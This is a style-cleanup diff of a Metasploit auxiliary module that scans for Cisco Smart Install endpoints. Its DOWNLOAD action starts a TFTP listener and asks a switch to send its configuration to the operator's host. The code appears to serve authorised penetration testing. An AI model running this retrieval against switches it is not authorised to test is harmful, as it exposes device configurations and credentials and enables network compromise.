@@ -13,28 +13,32 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => 'Identify Cisco Smart Install endpoints',
-        'Description'    => %q(
+        'Name' => 'Identify Cisco Smart Install endpoints',
+        'Description' => %q{
           This module attempts to connect to the specified Cisco Smart Install port
           and determines if it speaks the Smart Install Protocol.  Exposure of SMI
           to untrusted networks can allow complete compromise of the switch.
-        ),
-        'Author'         => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],
-        'References'     =>
-          [
-            ['URL', 'http://web.archive.org/web/20221003014218/http://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
-            ['URL', 'https://blogs.cisco.com/security/cisco-psirt-mitigating-and-detecting-potential-abuse-of-cisco-smart-install-feature'],
-            ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi'],
-            ['URL', 'https://github.com/Cisco-Talos/smi_check'],
-            ['URL', 'https://github.com/frostbits-security/SIET']
+        },
+        'Author' => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],
+        'References' => [
+          ['URL', 'http://web.archive.org/web/20221003014218/http://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],
+          ['URL', 'https://blogs.cisco.com/security/cisco-psirt-mitigating-and-detecting-potential-abuse-of-cisco-smart-install-feature'],
+          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi'],
+          ['URL', 'https://github.com/Cisco-Talos/smi_check'],
+          ['URL', 'https://github.com/frostbits-security/SIET']
 
-          ],
-        'License'        => MSF_LICENSE,
+        ],
+        'License' => MSF_LICENSE,
         'DefaultAction' => 'SCAN',
         'Actions' => [
           ['SCAN', 'Description' => 'Scan for instances communicating via Smart Install Protocol (default)'],
           ['DOWNLOAD', 'Description' => 'Retrieve configuration via Smart Install Protocol']
         ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
       )
     )
 
@@ -69,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
   def start_tftp
     print_status("Starting TFTP Server...")
     @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
-    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
+    @tftp.incoming_file_hook = Proc.new { |info| process_incoming(info) }
     @tftp.start
     add_socket(@tftp.sock)
     @main_thread = ::Thread.current
@@ -95,6 +99,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   def process_incoming(info)
     return if not info[:file]
+
     name = info[:file][:name]
     data = info[:file][:data]
     from = info[:from]
@@ -123,19 +128,20 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     begin
       case
-        when action.name == 'SCAN'
-          connect
-          return unless smi?
-        when action.name == 'DOWNLOAD'
-          start_tftp
-          connect
-          return unless smi?
-          disconnect # cant send any additional packets, so closing
-          connect
-          tftp_server = datastore['LHOST'] || Rex::Socket.source_address(ip)
-          request_config(tftp_server, datastore['CONFIG'])
-          print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
-          Rex.sleep(datastore['SLEEP'])
+      when action.name == 'SCAN'
+        connect
+        return unless smi?
+      when action.name == 'DOWNLOAD'
+        start_tftp
+        connect
+        return unless smi?
+
+        disconnect # cant send any additional packets, so closing
+        connect
+        tftp_server = datastore['LHOST'] || Rex::Socket.source_address(ip)
+        request_config(tftp_server, datastore['CONFIG'])
+        print_status("Waiting #{datastore['SLEEP']} seconds for configuration")
+        Rex.sleep(datastore['SLEEP'])
       end
     rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \
            ::Errno::ETIMEDOUT, ::Timeout::Error, ::EOFError => e
